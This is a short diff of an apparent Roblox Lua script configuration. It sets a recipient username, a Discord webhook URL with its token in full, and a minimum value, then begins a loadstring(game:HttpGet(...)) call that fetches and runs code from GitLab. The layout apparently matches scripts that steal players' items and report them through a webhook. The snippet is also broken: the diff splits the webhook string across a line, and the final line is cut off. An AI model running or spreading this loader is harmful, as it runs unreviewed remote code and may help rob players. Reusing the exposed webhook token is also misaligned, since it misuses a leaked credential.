@@ -1,5 +1,6 @@
 Username = "ndhdbdbdbdb29"
-Webhook = "https://discord.com/api/webhooks/1388709857883852903/b1zSIKxX3Cq8tPQ1gBpGNwqGRKNLRsB_PqYQQB3dj-BA89k0OtnYcmvwsFtgKKFxZ7FB"
+Webhook = "
+https://discord.com/api/webhooks/1388709857883852903/b1zSIKxX3Cq8tPQ1gBpGNwqGRKNLRsB_PqYQQB3dj-BA89k0OtnYcmvwsFtgKKFxZ7FB"
 Minimum Value = 1
 
 loadstring(game:HttpGet("https://gitlab.com/
